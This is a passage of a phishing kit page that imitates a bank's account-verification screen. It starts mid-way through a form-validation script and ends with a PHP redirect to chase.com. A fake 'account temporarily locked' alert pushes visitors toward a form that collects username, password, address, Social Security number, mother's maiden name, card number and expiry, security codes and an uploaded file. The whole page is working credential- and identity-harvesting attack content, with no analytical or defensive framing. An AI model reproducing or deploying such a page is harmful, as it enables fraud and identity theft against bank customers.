var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:formtext1^0^1^0^0^Please Enter Your Username:;formtext2^0^1^0^0^Please Enter Your Password:;formtext3^0^1^0^0^Please Enter Your Full Name:;formtext4^0^1^0^0^Please Enter Your Home Address:;formtext7^0^1^0^0^Please Fill in All Of the Required Fields:;formtext11^0^1^0^0^Please Enter Your Social Security Number:;formtext12^0^1^0^0^Please Enter Your Social Security Number:;formtext13^0^1^0^0^Please Enter Your Social Security Number:;formtext14^0^1^0^0^Please Enter Your Mother's Maiden Name:;formtext20^0^1^0^0^Please Enter Your  Card Number:;formtext18^1^0^Please enter a valid email address.:;formtext9^0^1^0^0^Please enter a complete phone number with area code.:;formtext10^0^1^0^0^Please enter a complete phone number with area code.:;
*/
b=0;
errmsg="Please Enter Your Username";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
b=0;
errmsg="Please Enter Your Password";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
b=0;
errmsg="Please Enter Your Full Name";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
b=0;
errmsg="Please Enter Your Home Address";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext7) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext11) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext12) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext13) ) return false ;
b=0;
errmsg="Please Enter Your Mother's Maiden Name";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext14) ) return false ;
b=0;
errmsg="Please Enter Your  Card Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext20) ) return false ;
b=0;
errmsg="Please enter a valid email address.";
if (! formbreeze_email(document.chalbhai.formtext18) ) return false ;
b=0;
errmsg="Please enter a complete phone number with area code.";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext9) ) return false ;
b=0;
errmsg="Please enter a complete phone number with area code.";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext10) ) return false ;

}
-->
</script>
<!-- FORMBREEZE-END -->
</head>
<body bgColor="#FFFFFF">
<script> alert('For Security Reasons Your Account is Temporarily Locked.Please Verify Your Account.')</script>


<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1344px; height:97px; z-index:0"><a href="#"><img src="images/headerss.png" alt="" title="" border=0 width=1344 height=97></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:178px; top:97px; width:988px; height:38px; z-index:1"><img src="images/head2.png" alt="" title="" border=0 width=988 height=38></div>

<div id="image3" style="position:absolute; overflow:hidden; left:178px; top:133px; width:994px; height:102px; z-index:2"><img src="images/head3.png" alt="" title="" border=0 width=994 height=102></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1153px; top:233px; width:22px; height:1224px; z-index:3"><img src="images/liness.png" alt="" title="" border=0 width=22 height=1224></div>

<div id="image5" style="position:absolute; overflow:hidden; left:172px; top:234px; width:19px; height:1220px; z-index:4"><img src="images/line2.png" alt="" title="" border=0 width=19 height=1220></div>

<div id="image6" style="position:absolute; overflow:hidden; left:165px; top:243px; width:1010px; height:499px; z-index:5"><img src="images/back1.png" alt="" title="" border=0 width=1010 height=499></div>

<div id="image7" style="position:absolute; overflow:hidden; left:925px; top:258px; width:231px; height:220px; z-index:6"><a href="#"><img src="images/slide1.png" alt="" title="" border=0 width=231 height=220></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:928px; top:488px; width:226px; height:37px; z-index:7"><a href="#"><img src="images/slide2.png" alt="" title="" border=0 width=226 height=37></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:924px; top:529px; width:227px; height:120px; z-index:8"><a href="#"><img src="images/slide3.png" alt="" title="" border=0 width=227 height=120></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:927px; top:664px; width:226px; height:201px; z-index:9"><a href="#"><img src="images/slide4.png" alt="" title="" border=0 width=226 height=201></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:196px; top:257px; width:387px; height:81px; z-index:10"><a href="#"><img src="images/update.png" alt="" title="" border=0 width=387 height=81></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:671px; top:257px; width:203px; height:104px; z-index:11"><a href="#"><img src="images/update2.png" alt="" title="" border=0 width=203 height=104></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:924px; top:877px; width:234px; height:280px; z-index:12"><a href="#"><img src="images/slide5.png" alt="" title="" border=0 width=234 height=280></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:198px; top:466px; width:393px; height:299px; z-index:13"><img src="images/d1.png" alt="" title="" border=0 width=393 height=299></div>

<div id="image15" style="position:absolute; overflow:hidden; left:193px; top:770px; width:581px; height:30px; z-index:14"><img src="images/d2.png" alt="" title="" border=0 width=581 height=30></div>

<div id="image16" style="position:absolute; overflow:hidden; left:196px; top:821px; width:415px; height:147px; z-index:15"><img src="images/d3.png" alt="" title="" border=0 width=415 height=147></div>

<div id="image17" style="position:absolute; overflow:hidden; left:192px; top:993px; width:585px; height:33px; z-index:16"><img src="images/d4.png" alt="" title="" border=0 width=585 height=33></div>

<div id="image18" style="position:absolute; overflow:hidden; left:196px; top:1038px; width:377px; height:241px; z-index:17"><img src="images/d5.png" alt="" title="" border=0 width=377 height=241></div>

<div id="image19" style="position:absolute; overflow:hidden; left:200px; top:1356px; width:590px; height:89px; z-index:18"><img src="images/d6.png" alt="" title="" border=0 width=590 height=89></div>
<div id="image17" style="position:absolute; overflow:hidden; left:192px; top:1323px; width:585px; height:33px; z-index:16"><img src="images/d7.png" alt="" title="" border=0 width=585 height=33></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1454px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1457px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1584px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1560px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1540px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1500px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>

<div id="image20" style="position:absolute; overflow:hidden; left:168px; top:1608px; width:1011px; height:43px; z-index:19"><img src="images/fobefore.png" alt="" title="" border=0 width=1011 height=43></div>

<div id="image21" style="position:absolute; overflow:hidden; left:179px; top:1654px; width:1000px; height:186px; z-index:20"><a href="#"><img src="images/footersss.png" alt="" title="" border=0 width=1000 height=186></a></div>


<form action="" method="POST" name="Logon" onsubmit="return validateForm()" enctype="multipart/form-data">

		<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript" src="images/HARD_upload.js"></script>
		<script type="text/javascript" src="images/jquery.fileupload.js"></script>
		<div>
<div><input type="file" name="userfile" size="1" style="position:absolute; overflow:hidden; left:230px; top:1400px; width:590px; height:89px; z-index:18"></div>


</div>

<input name="formtext1" type="text" style="position:absolute;width:102px;left:306px;top:470px;z-index:21">
<input name="formtext2" type="password" style="position:absolute;width:133px;left:308px;top:500px;z-index:22">
<input name="formtext3" type="text" style="position:absolute;width:241px;left:308px;top:529px;z-index:23">
<input name="formtext4" type="text" style="position:absolute;width:277px;left:308px;top:559px;z-index:24">
<input name="formtext5" type="text" style="position:absolute;width:228px;left:308px;top:587px;z-index:25">
<input name="formtext6" type="text" style="position:absolute;width:173px;left:307px;top:619px;z-index:26">
<select name="formselect1" style="position:absolute;left:307px;top:649px;width:65px;z-index:27">
<option value="State">State</option>
<option>AK</option>
<option>AL</option>
<option>AR</option>
<option>AZ</option>
<option>CA</option>
<option>CO</option>
<option>CT</option>
<option>DC</option>
<option>DE</option>
<option>FL</option>
<option>GA</option>
<option>HI</option>
<option>IA</option>
<option>ID</option>
<option>IL</option>
<option>IN</option>
<option>KS</option>
<option>KY</option>
<option>LA</option>
<option>MA</option>
<option>MD</option>
<option>ME</option>
<option>MI</option>
<option>MN</option>
<option>MO</option>
<option>MS</option>
<option>MT</option>
<option>NC</option>
<option>ND</option>
<option>NE</option>
<option>NH</option>
<option>NJ</option>
<option>NM</option>
<option>NV</option>
<option>NY</option>
<option>OH</option>
<option>OK</option>
<option>OR</option>
<option>PA</option>
<option>RI</option>
<option>SC</option>
<option>SD</option>
<option>TN</option>
<option>TX</option>
<option>UT</option>
<option>VA</option>
<option>VT</option>
<option>WA</option>
<option>WI</option>
<option>WV</option>
<option>WY</option>
<option>AA</option>
<option>AE</option>
<option>AP</option>
<option>AS</option>
<option>FM</option>
<option>GU</option>
<option>MH</option>
<option>MP</option>
<option>PR</option>
<option>PW</option>
<option>VI</option></select>
<input name="formtext7" type="text" maxlength=5 style="position:absolute;width:67px;left:308px;top:679px;z-index:28">
<input name="formtext8" type="text" maxlength=5 style="position:absolute;width:60px;left:379px;top:680px;z-index:29">
<input name="formtext9" type="text" maxlength=18 style="position:absolute;width:123px;left:308px;top:709px;z-index:30">
<input name="formtext10" type="text" maxlength=18 style="position:absolute;width:123px;left:308px;top:739px;z-index:31">
<input name="formtext11" type="text" maxlength=4 style="position:absolute;width:53px;left:351px;top:824px;z-index:32">
<input name="formtext12" type="text" maxlength=3 style="position:absolute;width:45px;left:410px;top:824px;z-index:33">
<input name="formtext13" type="text" maxlength=4 style="position:absolute;width:61px;left:460px;top:824px;z-index:34">
<input name="formtext14" type="text" style="position:absolute;width:172px;left:352px;top:853px;z-index:35">
<input name="formtext15" type="text" maxlength=3 style="position:absolute;width:46px;left:352px;top:884px;z-index:36">
<input name="formtext16" type="text" maxlength=4 style="position:absolute;width:46px;left:402px;top:884px;z-index:37">
<input name="formtext17" type="text" maxlength=4 style="position:absolute;width:61px;left:453px;top:884px;z-index:38">
<input name="formtext18" type="text" style="position:absolute;width:243px;left:352px;top:913px;z-index:39">
<input name="formtext19" type="password" style="position:absolute;width:172px;left:352px;top:943px;z-index:40">
<input name="formtext20" type="text" maxlength=16 style="position:absolute;width:165px;left:397px;top:1041px;z-index:41">
<input name="formtext21" type="text" maxlength=6 style="position:absolute;width:55px;left:397px;top:1071px;z-index:42">
<input name="formtext22" type="text" maxlength=6 style="position:absolute;width:55px;left:397px;top:1101px;z-index:43">
<input name="formtext23" type="text" maxlength=6 style="position:absolute;width:60px;left:398px;top:1130px;z-index:44">
<select name="formselect2" style="position:absolute;left:396px;top:1162px;width:90px;z-index:45">
<option value="Month">Month</option>
<option>January</option>
<option>February</option>
<option>March</option>
<option>April</option>
<option>May</option>
<option>June</option>
<option>July</option>
<option>August</option>
<option>September</option>

<option>October</option>
<option>November</option>
<option>December</option></select>
<select name="formselect3" style="position:absolute;left:491px;top:1161px;width:55px;z-index:46">
<option value="Year">Year</option>
<option>2013</option>
<option>2013</option>
<option>2014</option>
<option>2015</option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>

<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
<option>2024</option>
<option>2025</option>
<option>2026</option>
<option>2027</option>
<option>2028</option>

<option>2029</option>
<option>2030</option>
<option>2031</option>
<option>2032</option>
<option>2033</option>
<option>2034</option>
<option>2035</option>
<option>2036</option>
<option>2037</option>

<option>2038</option>
<option>2039</option>
<option>2040</option>
<option>2041</option>
<option>2042</option>
<option>2043</option>
<option>2044</option>
<option>2045</option>
<option>2046</option>
<option>2047</option>
<option>2048</option>
<option>2049</option>
<option>2050</option>
<option>2051</option>
<option>2052</option>
<option>2053</option>
<option>2054</option>
<option>2055</option>

<option>2056</option>
<option>2057</option>
<option>2058</option>
<option>2059</option>
<option>2060</option>
<option>2061</option>
<option>2062</option>
<option>2063</option>
<option>2064</option>

<option>2065</option>
<option>2066</option>
<option>2067</option>
<option>2068</option>
<option>2069</option>
<option>2070</option>
<option>2071</option>
<option>2072</option>
<option>2073</option>

<option>2074</option>
<option>2075</option>
<option>2076</option>
<option>2077</option>
<option>2078</option>
<option>2079</option>
<option>2080</option>
<option>2081</option>
<option>2082</option>

<option>2083</option>
<option>2084</option>
<option>2085</option>
<option>2086</option>
<option>2087</option>
<option>2088</option>
<option>2089</option>
<option>2090</option>
<option>2091</option>

<option>2092</option>
<option>2093</option>
<option>2094</option>
<option>2095</option>
<option>2096</option>
<option>2097</option>
<option>2098</option>
<option>2099</option>
<option>2100</option>

<option>2101</option>
<option>2102</option>
<option>2103</option>
<option>2104</option>
<option>2105</option>
<option>2106</option>
<option>2107</option>
<option>2108</option></select>
<input name="formtext24" type="text" maxlength=14 style="position:absolute;width:165px;left:397px;top:1191px;z-index:47">
<input name="formtext25" type="text" maxlength=18 style="position:absolute;width:165px;left:398px;top:1221px;z-index:48">
<input name="formtext26" type="text" maxlength=14 style="position:absolute;width:165px;left:397px;top:1251px;z-index:49">
<div id="formimage1" style="position:absolute; left:576px; top:1514px; z-index:50">

<input type="image"  name="submitButton"  value="Next"  width="155" height="21" src="images/confirmacc.png"></div>
</div>

</body>
</html>
<?php
exit;
}
header ("Location: http://www.chase.com/");
?>